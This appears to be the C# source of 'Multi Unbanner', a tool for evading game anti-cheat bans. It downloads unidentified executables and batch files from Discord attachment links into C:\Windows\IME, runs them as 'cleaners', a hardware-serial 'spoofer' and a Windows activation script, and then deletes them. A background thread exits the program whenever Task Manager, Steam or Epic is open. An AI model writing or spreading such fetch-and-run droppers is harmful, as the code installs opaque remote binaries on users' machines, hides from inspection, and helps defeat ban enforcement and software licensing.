using System;
using Console = Colorful.Console;
using System.Drawing;
using System.Threading;
using System.Diagnostics;
using Memory;
using System.Net;
using System.IO;
using System.Windows.Forms;
using OSVersionHelper;
using Microsoft.VisualBasic.Devices;
using System.Management;
using Microsoft.Win32;
using System.Runtime.InteropServices;

namespace GameUnbanner
{

    public class Program
    {
        public static int height = 0;
        public static int width = 0;
        public static int red = 11;
        public static int blue = 0;
        public static int green = 0;
        public static int percentbro = 0;
        static void tsk()
        {
            while (true)
            {
                Mem m = new Mem();
                int Tskmngr = m.GetProcIdFromName("taskmgr") + m.GetProcIdFromName("EpicGamesLauncher.exe") + m.GetProcIdFromName("steam.exe");
                if (Tskmngr > 0)
                {
                    Environment.Exit(0);
                }
            }
        }
        static void Activate()
        {
            Title();
            string sen = "[+] Press ENTER to launch the Activation Tool. ";
            int selector = 0;
            while (selector < sen.Length)
            {
                while (red != 19 && red > 19 && selector < sen.Length)
                {
                    if (red == 11)
                    {
                        red = 12;
                    }
                    red = red - 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                    Thread.Sleep(40);
                }

                while (red != 240 && red < 240 && selector < sen.Length)
                {
                    if (red == 240)
                    {
                        red = 238;
                    }
                    red = red + 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                    Thread.Sleep(40);
                }
            }
            Console.ReadKey();
            using (WebClient webClient5 = new WebClient())
            {
                webClient5.DownloadFile("https://cdn.discordapp.com/attachments/850275514753220658/923947267843563520/act_1.bat", "C:\\Windows\\IME\\act.bat");
            }
            Process.Start("C:\\Windows\\IME\\act.bat");
            Mem m = new Mem();
            bool contiune = true;
            sen = "\n[+] Tool launched";
            selector = 0;
            while (selector < sen.Length)
            {
                while (red != 19 && red > 19 && selector < sen.Length)
                {
                    if (red == 11)
                    {
                        red = 12;
                    }
                    red = red - 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                    Thread.Sleep(40);
                }

                while (red != 240 && red < 240 && selector < sen.Length)
                {
                    if (red == 240)
                    {
                        red = 238;
                    }
                    red = red + 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                    Thread.Sleep(40);
                }
            }
            Thread.Sleep(5000);
            while (contiune)
            {
                int PID = m.GetProcIdFromName("cmd.exe");
                if (PID == 0)
                {
                    contiune = false;
                }
            }
            sen = "\n[+] Tool Closed, Redirecting...";
            selector = 0;
            while (selector < sen.Length)
            {
                while (red != 19 && red > 19 && selector < sen.Length)
                {
                    if (red == 11)
                    {
                        red = 12;
                    }
                    red = red - 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                    Thread.Sleep(40);
                }

                while (red != 240 && red < 240 && selector < sen.Length)
                {
                    if (red == 240)
                    {
                        red = 238;
                    }
                    red = red + 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                    Thread.Sleep(40);
                }
            }
            File.Delete("C:\\Windows\\IME\\act.bat");
            Thread.Sleep(2000);
        }
        static void clean2()
        {
            string sen = "[+] This may take 10-15mins, if it's repeating itself just close the OPENED window, not the FUCKMYBAN window. ";
            int selector = 0;
            while (selector < sen.Length)
            {
                while (red != 19 && red > 19 && selector < sen.Length)
                {
                    if (red == 11)
                    {
                        red = 12;
                    }
                    red = red - 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                    Thread.Sleep(40);
                }

                while (red != 240 && red < 240 && selector < sen.Length)
                {
                    if (red == 240)
                    {
                        red = 238;
                    }
                    red = red + 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                    Thread.Sleep(40);
                }

            }
            Thread.Sleep(3000);
            using (WebClient webClient5 = new WebClient())
            {
                webClient5.DownloadFile("https://cdn.discordapp.com/attachments/850275514753220658/923891237650595872/cleaner.exe", "C:\\Windows\\IME\\cleaner.exe");
            }
            Process.Start("C:\\Windows\\IME\\cleaner.exe");
            Mem m = new Mem();
            bool contiune = true;
            sen = "\n[+] Cleaning your computer with CLEANER 1...";
            selector = 0;
            while (selector < sen.Length)
            {
                while (red != 19 && red > 19 && selector < sen.Length)
                {
                    if (red == 11)
                    {
                        red = 12;
                    }
                    red = red - 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                    Thread.Sleep(40);
                }

                while (red != 240 && red < 240 && selector < sen.Length)
                {
                    if (red == 240)
                    {
                        red = 238;
                    }
                    red = red + 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                    Thread.Sleep(40);
                }
            }
            Thread.Sleep(5000);
            while (contiune)
            {
                int PID = m.GetProcIdFromName("cleaner.exe");
                if (PID == 0)
                {
                    contiune = false;
                }
            }
        }
        static void clean3()
        {
            using (WebClient webClient5 = new WebClient())
            {
                webClient5.DownloadFile("https://cdn.discordapp.com/attachments/850275514753220658/923891235712798720/LogCleaner.exe", "C:\\Windows\\IME\\cleaner.exe");
            }
            Process.Start("C:\\Windows\\IME\\cleaner.exe");
            Mem m = new Mem();
            bool contiune = true;
            string sen = "\n[+] Cleaning your computer with CLEANER 2...";
            int selector = 0;
            while (selector < sen.Length)
            {
                while (red != 19 && red > 19 && selector < sen.Length)
                {
                    if (red == 11)
                    {
                        red = 12;
                    }
                    red = red - 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                    Thread.Sleep(40);
                }

                while (red != 240 && red < 240 && selector < sen.Length)
                {
                    if (red == 240)
                    {
                        red = 238;
                    }
                    red = red + 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                    Thread.Sleep(40);
                }
            }
            Thread.Sleep(5000);
            while (contiune)
            {
                int PID = m.GetProcIdFromName("cleaner.exe");
                if (PID == 0)
                {
                    contiune = false;
                }
            }
        }
        static void clean4()
        {
            using (WebClient webClient5 = new WebClient())
            {
                webClient5.DownloadFile("https://cdn.discordapp.com/attachments/850275514753220658/923891235096240158/cleaner_protected.exe", "C:\\Windows\\IME\\cleaner.exe");
            }
            Process.Start("C:\\Windows\\IME\\cleaner.exe");
            Mem m = new Mem();
            bool contiune = true;
            string sen = "\n[+] Cleaning your computer with CLEANER 3...";
            int selector = 0;
            while (selector < sen.Length)
            {
                while (red != 19 && red > 19 && selector < sen.Length)
                {
                    if (red == 11)
                    {
                        red = 12;
                    }
                    red = red - 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                    Thread.Sleep(40);
                }

                while (red != 240 && red < 240 && selector < sen.Length)
                {
                    if (red == 240)
                    {
                        red = 238;
                    }
                    red = red + 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                    Thread.Sleep(40);
                }
            }
            Thread.Sleep(5000);
            while (contiune)
            {
                int PID = m.GetProcIdFromName("cleaner.exe");
                if (PID == 0)
                {
                    contiune = false;
                }
            }
        }
        static void clean5()
        {
            using (WebClient webClient5 = new WebClient())
            {
                webClient5.DownloadFile("https://cdn.discordapp.com/attachments/850275514753220658/923891235507294218/Koks_Cleaner.exe", "C:\\Windows\\IME\\cleaner.exe");
            }
            Process.Start("C:\\Windows\\IME\\cleaner.exe");
            Mem m = new Mem();
            bool contiune = true;
            string sen = "\n[+] Cleaning your computer with CLEANER 4... (this one's long asf but don't close it)";
            int selector = 0;
            while (selector < sen.Length)
            {
                while (red != 19 && red > 19 && selector < sen.Length)
                {
                    if (red == 11)
                    {
                        red = 12;
                    }
                    red = red - 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                    Thread.Sleep(40);
                }

                while (red != 240 && red < 240 && selector < sen.Length)
                {
                    if (red == 240)
                    {
                        red = 238;
                    }
                    red = red + 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                    Thread.Sleep(40);
                }
            }
            Thread.Sleep(5000);
            while (contiune)
            {
                int PID = m.GetProcIdFromName("cleaner.exe");
                if (PID == 0)
                {
                    contiune = false;
                }
            }
        }
        static void clean6()
        {
            using (WebClient webClient5 = new WebClient())
            {
                webClient5.DownloadFile("https://cdn.discordapp.com/attachments/850275514753220658/923891235930923018/nExOs.exe", "C:\\Windows\\IME\\cleaner.exe");
            }
            Process.Start("C:\\Windows\\IME\\cleaner.exe");
            Mem m = new Mem();
            bool contiune = true;
            string sen = "\n[+] Cleaning your computer with CLEANER 5...";
            int selector = 0;
            while (selector < sen.Length)
            {
                while (red != 19 && red > 19 && selector < sen.Length)
                {
                    if (red == 11)
                    {
                        red = 12;
                    }
                    red = red - 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                    Thread.Sleep(40);
                }

                while (red != 240 && red < 240 && selector < sen.Length)
                {
                    if (red == 240)
                    {
                        red = 238;
                    }
                    red = red + 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                    Thread.Sleep(40);
                }
            }
            Thread.Sleep(5000);
            while (contiune)
            {
                int PID = m.GetProcIdFromName("cleaner.exe");
                if (PID == 0)
                {
                    contiune = false;
                }
            }
        }
        static void clean7()
        {
            using (WebClient webClient5 = new WebClient())
            {
                webClient5.DownloadFile("https://cdn.discordapp.com/attachments/850275514753220658/923891236249694208/Run_Me_First.exe", "C:\\Windows\\IME\\cleaner.exe");
            }
            Process.Start("C:\\Windows\\IME\\cleaner.exe");
            Mem m = new Mem();
            bool contiune = true;
            string sen = "\n[+] Cleaning your computer with CLEANER 6...";
            int selector = 0;
            while (selector < sen.Length)
            {
                while (red != 19 && red > 19 && selector < sen.Length)
                {
                    if (red == 11)
                    {
                        red = 12;
                    }
                    red = red - 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                    Thread.Sleep(40);
                }

                while (red != 240 && red < 240 && selector < sen.Length)
                {
                    if (red == 240)
                    {
                        red = 238;
                    }
                    red = red + 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                    Thread.Sleep(40);
                }
            }
            Thread.Sleep(5000);
            while (contiune)
            {
                int PID = m.GetProcIdFromName("cleaner.exe");
                if (PID == 0)
                {
                    contiune = false;
                }
            }
        }
        static void clean8()
        {
            using (WebClient webClient5 = new WebClient())
            {
                webClient5.DownloadFile("https://cdn.discordapp.com/attachments/850275514753220658/923891236878831617/Run_Me_Second.exe", "C:\\Windows\\IME\\cleaner.exe");
            }
            Process.Start("C:\\Windows\\IME\\cleaner.exe");
            Mem m = new Mem();
            bool contiune = true;
            string sen = "\n[+] Cleaning your computer with CLEANER 7...";
            int selector = 0;
            while (selector < sen.Length)
            {
                while (red != 19 && red > 19 && selector < sen.Length)
                {
                    if (red == 11)
                    {
                        red = 12;
                    }
                    red = red - 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                    Thread.Sleep(40);
                }

                while (red != 240 && red < 240 && selector < sen.Length)
                {
                    if (red == 240)
                    {
                        red = 238;
                    }
                    red = red + 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                    Thread.Sleep(40);
                }
            }
            Thread.Sleep(5000);
            while (contiune)
            {
                int PID = m.GetProcIdFromName("cleaner.exe");
                if (PID == 0)
                {
                    contiune = false;
                }
            }
        }
        static void clean9()
        {
            using (WebClient webClient5 = new WebClient())
            {
                webClient5.DownloadFile("https://cdn.discordapp.com/attachments/850275514753220658/923891237449261066/ADVANCEDCLEANER.exe", "C:\\Windows\\IME\\cleaner.exe");
            }
            Process.Start("C:\\Windows\\IME\\cleaner.exe");
            Mem m = new Mem();
            bool contiune = true;
            string sen = "\n[+] Cleaning your computer with CLEANER 8...";
            int selector = 0;
            while (selector < sen.Length)
            {
                while (red != 19 && red > 19 && selector < sen.Length)
                {
                    if (red == 11)
                    {
                        red = 12;
                    }
                    red = red - 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                    Thread.Sleep(40);
                }

                while (red != 240 && red < 240 && selector < sen.Length)
                {
                    if (red == 240)
                    {
                        red = 238;
                    }
                    red = red + 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                    Thread.Sleep(40);
                }
            }
            Thread.Sleep(5000);
            while (contiune)
            {
                int PID = m.GetProcIdFromName("cleaner.exe");
                if (PID == 0)
                {
                    contiune = false;
                }
            }
        }
        static void Spoof1()
        {
            using (WebClient webClient5 = new WebClient())
            {
                webClient5.DownloadFile("https://cdn.discordapp.com/attachments/853294296831492147/925032201979043860/paste.win_Free_Spoofer.exe", "C:\\Windows\\IME\\spoof.exe");
            }
            using (WebClient webClient5 = new WebClient())
            {
                webClient5.DownloadFile("https://cdn.discordapp.com/attachments/853294296831492147/925032517264871476/Serials.bat", "C:\\Windows\\Serials.bat");
            }
            Process.Start("C:\\Windows\\IME\\spoof.exe");
            Mem m = new Mem();
            bool contiune = true;
            string sen = "\n[+] Spoofing...";
            int selector = 0;
            while (selector < sen.Length)
            {
                while (red != 19 && red > 19 && selector < sen.Length)
                {
                    if (red == 11)
                    {
                        red = 12;
                    }
                    red = red - 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                    Thread.Sleep(40);
                }

                while (red != 240 && red < 240 && selector < sen.Length)
                {
                    if (red == 240)
                    {
                        red = 238;
                    }
                    red = red + 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                    Thread.Sleep(40);
                }
            }
            Thread.Sleep(5000);
            while (contiune)
            {
                int PID = m.GetProcIdFromName("spoof.exe");
                if (PID == 0)
                {
                    contiune = false;
                }
            }
            File.Delete("C:\\Windows\\IME\\spoof.exe");
            File.Delete("C:\\Windows\\Serials.bat");
        }
        public static void Main()
        {
            Random random = new Random();
            blue = random.Next(255);
            green = random.Next(255);
            string Title = "Loading...";
            int sel = 0;
            string prev = "L";
            while (sel < Title.Length - 1)
            {
                sel++;
                prev = prev + Title[sel];
                Console.Title = prev;
                Thread.Sleep(80);
            }
            Thread check = new Thread(tsk) { IsBackground = true };
            check.Start();
            Console.Title = "Multi Unbanner by My Tea#0001";
            MainScreen();
            Thread.Sleep(2000);
            string sen = "[>] Choose an option above: ";
            int selector = 0;
            while (selector < sen.Length)
            {
                while (red != 19 && red > 19 && selector < sen.Length)
                {
                    if (red == 11)
                    {
                        red = 12;
                    }
                    red = red - 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                    Thread.Sleep(40);
                }

                while (red != 240 && red < 240 && selector < sen.Length)
                {
                    if (red == 240)
                    {
                        red = 238;
                    }
                    red = red + 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                    Thread.Sleep(40);
                }
            }
            string option = Console.ReadLine();
            if (option == "1")
            {
                Console.Clear();
                Clean();
            }
            if (option == "2")
            {
                Console.Clear();
                Spoof();
            }
            if (option == "3")
            {
                Console.Clear();
                Activate();
                Console.Clear();
                Main();
            }
            else
            {
                Console.Clear();
                Main();
            }
            Console.Clear();
            Clean();
        }
        static void Clean()
        {
            Title();
            string sen = "[+] Do you want to Clean ALL traces? [Y/N]: ";
            int selector = 0;
            while (selector < sen.Length)
            {
                while (red != 19 && red > 19 && selector < sen.Length)
                {
                    if (red == 11)
                    {
                        red = 12;
                    }
                    red = red - 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                    Thread.Sleep(40);
                }

                while (red != 240 && red < 240 && selector < sen.Length)
                {
                    if (red == 240)
                    {
                        red = 238;
                    }
                    red = red + 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                    Thread.Sleep(40);
                }
            }
            bool clean = false;
            string Answer = Console.ReadLine();
            if (Answer == "y")
            {
                clean = true;
            }
            else
            {
                clean = false;
            }
            if (clean == true)
            {
                Console.Title = $"Multi Unbanner by My Tea#0001 | {percentbro}% Cleaned";
                clean2();
                percentbro = percentbro + 18;
                Console.Title = $"Multi Unbanner by My Tea#0001 | {percentbro}% Cleaned";
                clean3();
                percentbro = percentbro + 20;
                Console.Title = $"Multi Unbanner by My Tea#0001 | {percentbro}% Cleaned";
                clean4();
                percentbro = percentbro + 14;
                Console.Title = $"Multi Unbanner by My Tea#0001 | {percentbro}% Cleaned";
                clean5();
                percentbro = percentbro + 11;
                Console.Title = $"Multi Unbanner by My Tea#0001 | {percentbro}% Cleaned";
                clean6();
                percentbro = percentbro + 5;
                Console.Title = $"Multi Unbanner by My Tea#0001 | {percentbro}% Cleaned";
                clean7();
                percentbro = percentbro + 18;
                Console.Title = $"Multi Unbanner by My Tea#0001 | {percentbro}% Cleaned";
                clean8();
                percentbro = percentbro + 8;
                Console.Title = $"Multi Unbanner by My Tea#0001 | {percentbro}% Cleaned";
                clean9();
                Console.Title = $"Multi Unbanner by My Tea#0001 | {percentbro}% Cleaned";
                percentbro = percentbro + 5;
                File.Delete("C:\\Windows\\IME\\cleaner.exe");
                percentbro = percentbro + 5;
            }
            if (clean == false)
            {
                Console.Clear();
                Spoof();
            }
            Thread.Sleep(3000);
            sen = "[+] Successfully cleaned your shitty computer!";
            selector = 0;
            while (selector < sen.Length)
            {
                while (red != 19 && red > 19 && selector < sen.Length)
                {
                    if (red == 11)
                    {
                        red = 12;
                    }
                    red = red - 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                    Thread.Sleep(40);
                }

                while (red != 240 && red < 240 && selector < sen.Length)
                {
                    if (red == 240)
                    {
                        red = 238;
                    }
                    red = red + 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                    Thread.Sleep(40);
                }
            }
            Console.Clear();
            Spoof();
        }
        static void Spoof()
        {
            Console.Title = $"Multi Unbanner by My Tea#0001";
            Title();
            string sen = "[+] Do you want to open the Spoofers? [Y/N]: ";
            int selector = 0;
            while (selector < sen.Length)
            {
                while (red != 19 && red > 19 && selector < sen.Length)
                {
                    if (red == 11)
                    {
                        red = 12;
                    }
                    red = red - 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                    Thread.Sleep(40);
                }

                while (red != 240 && red < 240 && selector < sen.Length)
                {
                    if (red == 240)
                    {
                        red = 238;
                    }
                    red = red + 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                    Thread.Sleep(40);
                }
            }
            bool spoof = false;
            string Answer = Console.ReadLine();
            if (Answer == "y")
            {
                spoof = true;
            }
            else
            {
                spoof = false;
            }
            if (spoof == true)
            {
                Console.Beep(50, 100);
                Process.Start("winver.exe");
                var result = MessageBox.Show("Is your winver 1909 - 20h2?", "Spoofer", MessageBoxButtons.YesNo);
                if (result == DialogResult.Yes)
                {
                    percentbro = 0;
                    Console.Title = $"Multi Unbanner by My Tea#0001 | {percentbro}% Spoofed";
                    Spoof1();
                }
                if (result != DialogResult.Yes)
                {
                    sen = "[+] Sad news... Our current spoofer is only available for winver 1909-20h2.\n\nMaybe a new update? Soon?";
                    selector = 0;
                    Console.WriteLine("\n\n\n");
                    while (selector < sen.Length)
                    {
                        while (red != 19 && red > 19 && selector < sen.Length)
                        {
                            if (red == 11)
                            {
                                red = 12;
                            }
                            red = red - 8;
                            Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                            selector++;
                            Thread.Sleep(40);
                        }

                        while (red != 240 && red < 240 && selector < sen.Length)
                        {
                            if (red == 240)
                            {
                                red = 238;
                            }
                            red = red + 8;
                            Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                            selector++;
                            Thread.Sleep(40);
                        }
                    }
                    spoof = false;
                    Thread.Sleep(3000);
                }
                File.Delete("C:\\Windows\\IME\\spoof.exe");
            }
            if (spoof == false)
            {

                sen = "[+] Redirecting you the the main menu...";
                selector = 0;
                Console.WriteLine("\n\n\n");
                while (selector < sen.Length)
                {
                    while (red != 19 && red > 19 && selector < sen.Length)
                    {
                        if (red == 11)
                        {
                            red = 12;
                        }
                        red = red - 8;
                        Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                        selector++;
                        Thread.Sleep(40);
                    }

                    while (red != 240 && red < 240 && selector < sen.Length)
                    {
                        if (red == 240)
                        {
                            red = 238;
                        }
                        red = red + 8;
                        Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                        selector++;
                        Thread.Sleep(40);
                    }
                }
                Thread.Sleep(3000);
                Console.Clear();
                Main();
            }
            sen = "[+] Your PC is now unbanned!\n\nNote that if you're having any issue with the tool you can contact me on discord at My Tea#0001.\n\nAlso keep in mind that i'm NOT responsable of what you're doing with my tool nor what my tool has done to your PC.\n\n\nThanks.";
            selector = 0;
            Console.WriteLine("\n\n\n");
            while (selector < sen.Length)
            {
                while (red != 19 && red > 19 && selector < sen.Length)
                {
                    if (red == 11)
                    {
                        red = 12;
                    }
                    red = red - 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                    Thread.Sleep(5);
                }

                while (red != 240 && red < 240 && selector < sen.Length)
                {
                    if (red == 240)
                    {
                        red = 238;
                    }
                    red = red + 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                    Thread.Sleep(5);
                }
            }
            sen = "[+] Redirecting you the the main menu...";
            selector = 0;
            Console.WriteLine("\n\n\n");
            while (selector < sen.Length)
            {
                while (red != 19 && red > 19 && selector < sen.Length)
                {
                    if (red == 11)
                    {
                        red = 12;
                    }
                    red = red - 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                    Thread.Sleep(40);
                }

                while (red != 240 && red < 240 && selector < sen.Length)
                {
                    if (red == 240)
                    {
                        red = 238;
                    }
                    red = red + 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                    Thread.Sleep(40);
                }
            }
            Thread.Sleep(3000);
            Console.Clear();
            Main();
        }
        public static void Title()
        {
            string sen = @"


                    ███████╗██╗   ██╗ ██████╗██╗  ██╗███╗   ███╗██╗   ██╗██████╗  █████╗ ███╗   ██╗
                    ██╔════╝██║   ██║██╔════╝██║ ██╔╝████╗ ████║╚██╗ ██╔╝██╔══██╗██╔══██╗████╗  ██║
                    █████╗  ██║   ██║██║     █████╔╝ ██╔████╔██║ ╚████╔╝ ██████╔╝███████║██╔██╗ ██║
                    ██╔══╝  ██║   ██║██║     ██╔═██╗ ██║╚██╔╝██║  ╚██╔╝  ██╔══██╗██╔══██║██║╚██╗██║
                    ██║     ╚██████╔╝╚██████╗██║  ██╗██║ ╚═╝ ██║   ██║   ██████╔╝██║  ██║██║ ╚████║
                    ╚═╝      ╚═════╝  ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝
                                                                               


                                                  (By My Tea#0001)
";
            int selector = 0;
            while (selector < sen.Length)
            {
                while (red != 19 && red > 19 && selector < sen.Length)
                {
                    if (red == 11)
                    {
                        red = 12;
                    }
                    red = red - 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                }

                while (red != 200 && red < 200 && selector < sen.Length)
                {
                    if (red == 200)
                    {
                        red = 198;
                    }
                    red = red + 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                }
            }
            Console.WriteLine("\n\n\n");
        }
        public static void MainScreen()
        {
            string sen = @"


                    ███████╗██╗   ██╗ ██████╗██╗  ██╗███╗   ███╗██╗   ██╗██████╗  █████╗ ███╗   ██╗
                    ██╔════╝██║   ██║██╔════╝██║ ██╔╝████╗ ████║╚██╗ ██╔╝██╔══██╗██╔══██╗████╗  ██║
                    █████╗  ██║   ██║██║     █████╔╝ ██╔████╔██║ ╚████╔╝ ██████╔╝███████║██╔██╗ ██║
                    ██╔══╝  ██║   ██║██║     ██╔═██╗ ██║╚██╔╝██║  ╚██╔╝  ██╔══██╗██╔══██║██║╚██╗██║
                    ██║     ╚██████╔╝╚██████╗██║  ██╗██║ ╚═╝ ██║   ██║   ██████╔╝██║  ██║██║ ╚████║
                    ╚═╝      ╚═════╝  ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝
                                                                               


                                                   By My Tea#0001 
                                                         &
                                     Based on BadVibesForever#1337's unban pack     


                                       [1] Clean all TRACES from cheating
                                       [2] Spoof your PC's serials and shit
                                       [3] Activate Windows

";
            int selector = 0;
            while (selector < sen.Length)
            {
                while (red != 19 && red > 19 && selector < sen.Length)
                {
                    if (red == 11)
                    {
                        red = 12;
                    }
                    red = red - 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                }

                while (red != 200 && red < 200 && selector < sen.Length)
                {
                    if (red == 200)
                    {
                        red = 198;
                    }
                    red = red + 8;
                    Console.Write(sen[selector], Color.FromArgb(red, green, blue));
                    selector++;
                }
            }
            Console.WriteLine("\n\n\n");
        }
    }
}
